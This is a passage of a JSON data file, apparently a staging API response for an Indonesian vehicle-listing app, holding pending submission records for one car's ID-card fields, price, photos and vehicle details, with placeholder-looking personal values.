                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""b6c2b1f4-641c-427b-97b7-eac8674295d0"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""city"",
                    ""value"": ""JAKARTA BARAT"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""2e11949e-78f8-4083-9032-fbd4eebbad5a"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""occupation"",
                    ""value"": ""WIRASWASTA"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""b9698aeb-46b9-4927-9c36-0289aba20dd5"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""village_domicile"",
                    ""value"": ""MAJU MAKMUR"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""fbfa37db-5cbc-4335-9d6c-3e440b3f3de4"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""rt_rw_domicile"",
                    ""value"": ""007/001"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""7e8ba75e-888a-4a60-8f99-675e6c3b7d3a"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""village"",
                    ""value"": ""MAJU MAKMUR"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""e0cb9809-639a-4de9-b908-78634736bd1f"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""gender"",
                    ""value"": ""LAKI-LAKI"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""911afa00-0d9b-4507-974e-d75528647421"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""nationality"",
                    ""value"": """",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""22d12274-56ef-411d-8fbc-1c6ffd9dc587"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""ktp_media"",
                    ""value"": {
                        ""created_at"": 1712290592,
                        ""deleted_at"": 0,
                        ""media_id"": ""286030f4-fd6e-4849-9d3f-05dc652e509d"",
                        ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/ocr/ktp/1712290592.jpg"",
                        ""mimetype"": ""image/jpeg"",
                        ""name"": ""1712290592.jpg"",
                        ""path"": ""ocr/ktp/1712290592.jpg"",
                        ""purpose"": ""ocr-ktp"",
                        ""size"": 136446,
                        ""user"": null,
                        ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47""
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""a3f20c10-6b5b-4426-9e31-aff1234692ef"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""nik"",
                    ""value"": ""3173123456789012"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""5c28a337-f490-4167-90a7-1a11fba4976b"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""birth_place"",
                    ""value"": ""JAKARTA"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""47b28d7e-179f-42c3-9841-e398aaf89b0c"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""rt_rw"",
                    ""value"": ""007/001"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""fc2da52f-d07e-4ab6-bbd1-4adcd671e0a7"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""city_domicile"",
                    ""value"": ""JAKARTA BARAT"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""49f8facf-674e-4d59-a906-391f02b5aac9"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""phone_number"",
                    ""value"": """",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""620d45d0-368f-4bb4-8d4e-92ddd40b7b4a"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""name"",
                    ""value"": ""Rahmad"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""d6ea2198-5082-4be1-afa9-32f94d5e4e7e"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""district"",
                    ""value"": ""KEMBANGAN"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""8fba6900-7a8e-4190-8c8f-4d343a485a30"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""birth_date"",
                    ""value"": ""1980-01-12T00:00:00Z"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""562d9049-4aff-47fc-8668-8a82d56e892a"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""ref_id"",
                    ""value"": """",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""88bef15e-7839-4a3f-b693-a1864754c3ab"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""address_domicile"",
                    ""value"": ""JL. SUKSES BAHAGIA"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""47de984a-2c8c-451f-b33f-479be6c53528"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""province_domicile"",
                    ""value"": ""PROVINSI DKI JAKARTA"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""0d12af16-6c7b-40a0-a03c-91f07f490a47"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""district_domicile"",
                    ""value"": ""KEMBANGAN"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""f29eb604-c0f3-4256-80ba-4e3755bb83d3"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""marital_status"",
                    ""value"": ""KAWIN"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                }
            ],
            ""price"": [
                {
                    ""uv_submission_id"": ""c8709c4c-05bf-462d-9e3d-345cfc34b863"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""price"",
                    ""field"": ""price"",
                    ""value"": 250000000,
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                }
            ],
            ""vehicle-image"": [
                {
                    ""uv_submission_id"": ""c730aaa4-21b7-4e16-afb9-8ccab55f0dfa"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Tampak Depan"",
                    ""value"": {
                        ""vehicle_image_id"": ""422d4321-bda2-421e-bf4a-7ddf968262bf"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""4f0daecb-d4ce-4593-bff3-cd79f8d8cd1b"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""0d2f3193-20cd-4c70-8e02-b4d56c643013"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Tampak Samping Kanan"",
                    ""value"": {
                        ""vehicle_image_id"": ""115fc88a-35e1-4093-a8d1-29294e1bd29e"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""94d995ae-989d-4384-bfe6-4c5c4e927bdc"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""0e3b15c1-bb65-4fe7-bd86-f7d8d57f24b3"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Tampak Samping Kiri"",
                    ""value"": {
                        ""vehicle_image_id"": ""03f166c1-bbf5-489c-9449-6f9a99c6a965"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""8335ed3b-9380-48e1-85c1-42ffa1e2dea6"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""0d590ea6-8d13-4441-b3b8-f2019c0703d4"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Tampak Belakang"",
                    ""value"": {
                        ""vehicle_image_id"": ""b4afa05b-a874-43fc-bda8-d2c3677cc884"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""b8aeade6-4de9-4b46-be02-0a4d1994602c"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""ae08f5d8-0448-4750-b1bd-1f8744cf64b1"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Spidometer Kendaraan"",
                    ""value"": {
                        ""vehicle_image_id"": ""02d47b7f-d55b-4dcc-9996-310de4d6bcb2"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""00746412-72cc-46fd-b6b7-64f16e0276f7"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""0c744d6f-c841-456b-8acb-fb64f8132c35"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Dashboard Kendaraan"",
                    ""value"": {
                        ""vehicle_image_id"": ""5e6d1324-e472-4669-8f0e-d5014c682ac1"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""93bd78eb-cd01-42d7-8a6e-581d6c69a8f9"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""b34a79e2-0f8d-486a-8fb2-b6fd1edd5b60"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Mesin "",
                    ""value"": {
                        ""vehicle_image_id"": ""67eb048c-65cb-43c2-861d-97547afc468c"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""3a17ff9a-2c0a-408c-ac2a-b2347a1e3194"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""93194fbc-3458-496a-9040-c14796ad8831"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Kursi Depan"",
                    ""value"": {
                        ""vehicle_image_id"": ""3cfe638d-8e6d-4cde-838e-c864c40019b5"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""0690ed99-bdac-4d76-8174-5921a3cbfee3"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""f5cdaa30-08f6-466d-82b4-3a33328eb39f"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Kursi Belakang"",
                    ""value"": {
                        ""vehicle_image_id"": ""8f7ea638-aee0-41df-a0ec-507023259ee6"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""9a88f049-9e13-4214-b5a6-e3b99be221a8"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""c830ef5a-8cb0-4a0e-aeb6-01192cd26ef1"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-image"",
                    ""field"": ""Lainnya"",
                    ""value"": {
                        ""vehicle_image_id"": ""d8004e98-ab4d-46c1-845d-ee0594683d37"",
                        ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                        ""vit_id"": ""fef8fb52-39e0-4454-849c-567dac324571"",
                        ""created_at"": 1712402378,
                        ""updated_at"": 1712402378,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                            ""path"": ""community/post/image/1703041365.png"",
                            ""size"": 455444,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                            ""name"": ""1703041365.png"",
                            ""purpose"": ""image"",
                            ""created_at"": 1703041365,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                            ""user"": null
                        }
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                }
            ],
            ""vehicle-info"": [
                {
                    ""uv_submission_id"": ""85c1ff9a-bc41-46d3-9d74-4b24d57fce82"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""vehicle_color"",
                    ""value"": {
                        ""created_at"": 1702731982,
                        ""deleted_at"": 0,
                        ""hex"": ""#101828"",
                        ""name"": ""Hitam"",
                        ""updated_at"": 1702731982,
                        ""vehicle_color_id"": ""af457484-4a2d-41a2-9b50-33a797203345""
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""06fd0763-b86e-4749-93ba-c1e5431b6ee7"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""description"",
                    ""value"": ""[new-flow] Honda Civic Type R 6-Speed MT, individual owned, listed by owner"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""f4dd57a6-9b2d-497b-883c-4b978e178232"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""odometer"",
                    ""value"": 35000,
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""13e1f14d-ce14-472e-8713-943b40cc8acb"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""vehicle_variant"",
                    ""value"": {
                        ""vehicle_variant_id"": ""9cf3e998-7c5d-4472-b1b1-cc902ef8b93f"",
                        ""name"": ""6-Speed MT"",
                        ""vehicle_series_id"": ""8cf758e4-7ff7-4d4a-8ae7-195de1dfe34e"",
                        ""vehicle_brand_id"": ""31edaaaa-631c-4254-82a5-f3423fee3050"",
                        ""vehicle_category_id"": ""e35060f5-538e-4a5e-a8dc-44a4a875d942"",
                        ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                        ""vehicle_fuel_id"": ""7f5ceae2-24ff-4add-a3ca-97352cb1443f"",
                        ""vehicle_transmission_id"": ""5a395636-3a47-432f-997f-cc215f80fe1e"",
                        ""vehicle_type_id"": ""b32b65cb-3a97-4bfb-bf24-07f7cd07457d"",
                        ""code"": """",
